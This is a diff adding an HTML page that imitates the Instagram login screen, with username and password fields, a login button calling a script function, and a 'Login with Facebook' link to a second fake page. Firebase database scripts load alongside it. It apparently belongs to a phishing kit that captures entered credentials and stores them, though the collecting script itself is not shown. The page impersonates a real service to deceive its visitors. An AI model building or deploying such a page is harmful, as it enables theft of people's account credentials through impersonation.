@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="https://arabasiastarz.com/season-2/assets/images/favicon.ico">
+  <link rel="stylesheet" href="assets/css/main.css">
+
+  <script src="/js/jquery-3.6.0.min.js"></script>
+  <script src="/js/index.js"></script>
+ 
+  <title>Instagram</title>
+</head>
+<body>
+
+<div id="igp">
+  
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="assets/img/homepage.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+
+                <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+                <div class="c-panel__form">
+                  <br>
+                  <input type="text" class="c-panel__input" class="form-control" required id="ig-uname" placeholder="Phone number, username, or email"><br>
+                  <input type="text" class="c-panel__input" class="form-control" required id="ig-pass" placeholder="Password">
+                  <button onclick="iglog()" id="ig-log" class="c-btn"> Log In</button> 
+                  <span class="c-panel__span">OR</span>
+                </div>
+                <a href="/secured/fb/login.html" class="c-panel__facebook">Login with Facebook</a> <br>
+                <a href="#" class="c-panel__forgot">Forgot password?</a>
+                <br>
+                <br>
+              </div>
+              <div class="c-signup group">
+                <p>Don't have an account? <span>Sign up</span></p>
+              </div>
+
+
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+  
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+  <script src="/js/firebase.js">
+
+
+
+  </script>
+</body>
+</html>
